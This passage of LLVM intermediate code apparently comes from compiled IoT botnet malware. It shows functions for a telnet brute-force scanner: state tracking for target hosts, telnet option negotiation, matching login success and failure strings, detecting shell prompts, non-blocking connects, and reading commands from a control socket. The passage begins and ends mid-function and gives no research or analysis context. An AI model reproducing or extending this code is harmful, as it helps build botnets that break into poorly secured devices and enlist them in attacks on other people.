  br i1 %8, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %.0.lcssa = phi i32 [ 0, %0 ], [ %..0, %._crit_edge.loopexit ]
  %9 = call i32 @close(i32 %2) #3
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  %8 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 0
  store i64 30, i64* %8, align 8
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 1
  store i64 0, i64* %9, align 8
  %10 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #3, !srcloc !1
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %5) #3
  %22 = icmp sgt i32 %2, 1
  br i1 %22, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %31
  %.in = phi i32 [ %23, %31 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %32, %31 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %29, %31 ], [ %1, %.lr.ph.preheader ]
  %23 = add nsw i32 %.in, -1
  %24 = load i32, i32* @mainCommSock, align 4
  %25 = call i64 @recv(i32 %24, i8* nonnull %6, i64 1, i32 0) #3
  %26 = icmp eq i64 %25, 1
  br i1 %26, label %27, label %._crit_edge.loopexit

; <label>:27:                                     ; preds = %.lr.ph
  %28 = load i8, i8* %6, align 1
  %29 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %28, i8* %.01923, align 1
  %30 = icmp eq i8 %28, 10
  br i1 %30, label %._crit_edge.loopexit, label %31

; <label>:31:                                     ; preds = %27
  %32 = add nuw nsw i32 %.024, 1
  %33 = icmp sgt i32 %23, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %31, %27
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %29, %31 ], [ %29, %27 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %32, %31 ], [ %.024, %27 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #4

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t* nocapture readonly) local_unnamed_addr #1 {
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 1
  %3 = load i32, i32* %2, align 4
  %4 = tail call i8* @inet_ntoa(i32 %3) #3
  ret i8* %4
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8** nocapture readonly) local_unnamed_addr #1 {
  %6 = sext i32 %3 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %2, i8 0, i64 %6, i32 1, i1 false)
  %7 = tail call i32 @read_with_timeout(i32 %0, i32 %1, i8* %2, i32 %3)
  %8 = tail call i32 @contains_string(i8* %2, i8** %4)
  %not. = icmp ne i32 %8, 0
  %.0 = zext i1 %not. to i32
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  store i64 0, i64* %7, align 8
  %8 = sext i32 %1 to i64
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  store i64 %8, i64* %9, align 8
  %10 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #3, !srcloc !2
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %6) #3
  %22 = icmp slt i32 %21, 1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %4
  %24 = sext i32 %3 to i64
  %25 = call i64 @recv(i32 %0, i8* %2, i64 %24, i32 0) #3
  %26 = trunc i64 %25 to i32
  br label %27

; <label>:27:                                     ; preds = %4, %23
  %.0 = phi i32 [ %26, %23 ], [ 0, %4 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #3
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8** nocapture readonly) local_unnamed_addr #1 {
  br label %3

; <label>:3:                                      ; preds = %3, %2
  %indvars.iv13 = phi i64 [ %indvars.iv.next14, %3 ], [ 0, %2 ]
  %indvars.iv.next14 = add nuw nsw i64 %indvars.iv13, 1
  %4 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv.next14
  %5 = load i8*, i8** %4, align 8
  %6 = icmp eq i8* %5, null
  br i1 %6, label %.preheader, label %3

.preheader:                                       ; preds = %3
  %7 = trunc i64 %indvars.iv13 to i32
  %8 = icmp slt i32 %7, 0
  br i1 %8, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  %sext = shl i64 %indvars.iv13, 32
  %9 = ashr exact i64 %sext, 32
  br label %.lr.ph

; <label>:10:                                     ; preds = %.lr.ph
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %11 = icmp slt i64 %indvars.iv, %9
  br i1 %11, label %.lr.ph, label %._crit_edge.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %12 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %0, i8* %13) #3
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %10, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %10
  %.09.ph = phi i32 [ 0, %10 ], [ 1, %.lr.ph ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.09 = phi i32 [ 0, %.preheader ], [ %.09.ph, %._crit_edge.loopexit ]
  ret i32 %.09
}

declare i32 @strcasestr(...) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t* nocapture, i32) local_unnamed_addr #1 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %4, label %8

; <label>:4:                                      ; preds = %2
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 0
  %6 = load i32, i32* %5, align 8
  %7 = tail call i32 @close(i32 %6) #3
  br label %8

; <label>:8:                                      ; preds = %4, %2
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 7
  store i32 0, i32* %9, align 8
  %10 = trunc i32 %1 to i8
  %11 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 2
  store i8 %10, i8* %11, align 8
  %12 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 9
  %13 = load i8*, i8** %12, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t* nocapture) local_unnamed_addr #1 {
  tail call void @advance_state(%struct.telstate_t* %0, i32 0)
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 3
  store i8 1, i8* %2, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_success(i8* %0)
  %3 = icmp eq i32 %2, 0
  br i1 %3, label %4, label %7

; <label>:4:                                      ; preds = %1
  %5 = tail call i32 @contains_fail(i8* %0)
  %6 = icmp ne i32 %5, 0
  br label %7

; <label>:7:                                      ; preds = %1, %4
  %8 = phi i1 [ true, %1 ], [ %6, %4 ]
  %9 = zext i1 %8 to i32
  ret i32 %9
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #3
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #18
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #3, !srcloc !3
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #3
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #3
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #3
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %23, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #3
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %12 = load i32*, i32** @pids, align 8
  %13 = getelementptr inbounds i32, i32* %12, i64 %11
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %11
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = load i64, i64* @numpids, align 8
  %19 = add i64 %18, -1
  %20 = icmp ult i64 %17, %19
  br i1 %20, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.lcssa = phi i64 [ 0, %3 ], [ %19, %._crit_edge.loopexit ]
  %21 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %21, align 4
  %22 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  tail call void @free(i8* %22) #3
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %23

; <label>:23:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #11 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #15
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext29 = shl i64 %1, 32
  %5 = ashr exact i64 %sext29, 32
  %6 = getelementptr inbounds i8, i8* %0, i64 %5
  %sext41 = shl i64 %1, 32
  %7 = ashr exact i64 %sext41, 32
  %8 = icmp sgt i32 %2, 0
  br i1 %8, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %9 = icmp sgt i32 %2, %.1.lcssa
  br i1 %9, label %.lr.ph.preheader.1, label %.critedge.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %14, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %10 = sub nsw i64 0, %indvars.iv
  %11 = getelementptr inbounds i8, i8* %6, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = trunc i64 %indvars.iv to i32
  switch i8 %12, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %14 = add nsw i32 %.130, 1
  %15 = icmp sgt i64 %7, %indvars.iv.next
  br i1 %15, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %13, %.lr.ph ], [ %14, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %16 = sext i32 %.1.lcssa to i64
  %17 = sub nsw i64 0, %16
  %18 = getelementptr inbounds i8, i8* %4, i64 %17
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %19, 58
  br i1 %20, label %21, label %.preheader.137

; <label>:21:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.preheader.1:                               ; preds = %.preheader.137
  %22 = sext i32 %.1.lcssa to i64
  br label %.lr.ph.1

.lr.ph.1:                                         ; preds = %.critedge1.1, %.lr.ph.preheader.1
  %indvars.iv.1 = phi i64 [ %22, %.lr.ph.preheader.1 ], [ %indvars.iv.next.1, %.critedge1.1 ]
  %.130.1 = phi i32 [ %.1.lcssa, %.lr.ph.preheader.1 ], [ %27, %.critedge1.1 ]
  %23 = sub nsw i64 0, %indvars.iv.1
  %24 = getelementptr inbounds i8, i8* %6, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = trunc i64 %indvars.iv.1 to i32
  switch i8 %25, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %27 = add nsw i32 %.130.1, 1
  %28 = icmp sgt i64 %7, %indvars.iv.next.1
  br i1 %28, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %26, %.lr.ph.1 ], [ %27, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %29 = sext i32 %.1.lcssa.1 to i64
  %30 = sub nsw i64 0, %29
  %31 = getelementptr inbounds i8, i8* %4, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = icmp eq i8 %32, 62
  br i1 %33, label %21, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %34 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %34, label %.lr.ph.preheader.2, label %.critedge.2

.lr.ph.preheader.2:                               ; preds = %.preheader.238
  %35 = sext i32 %.1.lcssa.1 to i64
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.critedge1.2, %.lr.ph.preheader.2
  %indvars.iv.2 = phi i64 [ %35, %.lr.ph.preheader.2 ], [ %indvars.iv.next.2, %.critedge1.2 ]
  %.130.2 = phi i32 [ %.1.lcssa.1, %.lr.ph.preheader.2 ], [ %40, %.critedge1.2 ]
  %36 = sub nsw i64 0, %indvars.iv.2
  %37 = getelementptr inbounds i8, i8* %6, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = trunc i64 %indvars.iv.2 to i32
  switch i8 %38, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %40 = add nsw i32 %.130.2, 1
  %41 = icmp sgt i64 %7, %indvars.iv.next.2
  br i1 %41, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %39, %.lr.ph.2 ], [ %40, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %42 = sext i32 %.1.lcssa.2 to i64
  %43 = sub nsw i64 0, %42
  %44 = getelementptr inbounds i8, i8* %4, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = icmp eq i8 %45, 37
  br i1 %46, label %21, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %47 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %47, label %.lr.ph.preheader.3, label %.critedge.3

.lr.ph.preheader.3:                               ; preds = %.preheader.339
  %48 = sext i32 %.1.lcssa.2 to i64
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.critedge1.3, %.lr.ph.preheader.3
  %indvars.iv.3 = phi i64 [ %48, %.lr.ph.preheader.3 ], [ %indvars.iv.next.3, %.critedge1.3 ]
  %.130.3 = phi i32 [ %.1.lcssa.2, %.lr.ph.preheader.3 ], [ %53, %.critedge1.3 ]
  %49 = sub nsw i64 0, %indvars.iv.3
  %50 = getelementptr inbounds i8, i8* %6, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = trunc i64 %indvars.iv.3 to i32
  switch i8 %51, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %53 = add nsw i32 %.130.3, 1
  %54 = icmp sgt i64 %7, %indvars.iv.next.3
  br i1 %54, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %52, %.lr.ph.3 ], [ %53, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %55 = sext i32 %.1.lcssa.3 to i64
  %56 = sub nsw i64 0, %55
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = icmp eq i8 %58, 36
  br i1 %59, label %21, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %60 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %60, label %.lr.ph.preheader.4, label %.critedge.4

.lr.ph.preheader.4:                               ; preds = %.preheader.440
  %61 = sext i32 %.1.lcssa.3 to i64
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.critedge1.4, %.lr.ph.preheader.4
  %indvars.iv.4 = phi i64 [ %61, %.lr.ph.preheader.4 ], [ %indvars.iv.next.4, %.critedge1.4 ]
  %.130.4 = phi i32 [ %.1.lcssa.3, %.lr.ph.preheader.4 ], [ %66, %.critedge1.4 ]
  %62 = sub nsw i64 0, %indvars.iv.4
  %63 = getelementptr inbounds i8, i8* %6, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = trunc i64 %indvars.iv.4 to i32
  switch i8 %64, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %66 = add nsw i32 %.130.4, 1
  %67 = icmp sgt i64 %7, %indvars.iv.next.4
  br i1 %67, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %65, %.lr.ph.4 ], [ %66, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %68 = sext i32 %.1.lcssa.4 to i64
  %69 = sub nsw i64 0, %68
